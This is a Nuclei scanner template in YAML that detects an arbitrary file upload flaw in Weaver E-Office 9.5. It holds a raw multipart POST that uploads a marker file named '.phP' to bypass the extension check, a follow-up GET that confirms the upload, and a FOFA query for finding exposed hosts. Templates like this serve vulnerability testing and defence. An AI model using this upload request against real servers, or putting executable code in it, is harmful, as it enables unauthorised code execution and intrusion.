http:
- extractors:
  - group: 1
    internal: true
    name: id
    part: body
    regex:
    - \\\/attachment\\\/([0-9]+)\\\/
    type: regex
  host-redirects: true
  matchers:
  - part: body_2
    type: word
    words:
    - '{{randstr}}'
  matchers-condition: and
  max-redirects: 2
  raw:
  - 'POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt


    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

    Content-Disposition: form-data; name="upload_quwan"; filename="{{filename}}.phP"

    Content-Type: image/jpeg


    {{randstr}}

    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

    Content-Disposition: form-data; name="file"; filename=""

    Content-Type: application/octet-stream



    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--

    '
  - 'GET /attachment/{{id}}/{{filename}}.phP HTTP/1.1

    Host: {{Hostname}}

    '
id: weaver-eoffice-file-upload
info:
  author: princechaddha
  classification:
    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
  description: 'Weaver E-Office version 9.5 is susceptible to an arbitrary file upload
    vulnerability. This flaw allows malicious actors to upload and execute arbitrary
    code or files without proper validation or authorization.

    '
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-EOffice\""
    max-request: 2
    product: e-office
    vendor: weaver
    verified: true
  name: Weaver E-Office v9.5 - Arbitrary File Upload
  reference:
  - https://github.com/RCEraser/cve/blob/main/Weaver.md
  severity: high
  tags: e-office,weaver,intrusive,file-upload,vuln
variables:
  filename: '{{rand_base(7, "abc")}}'
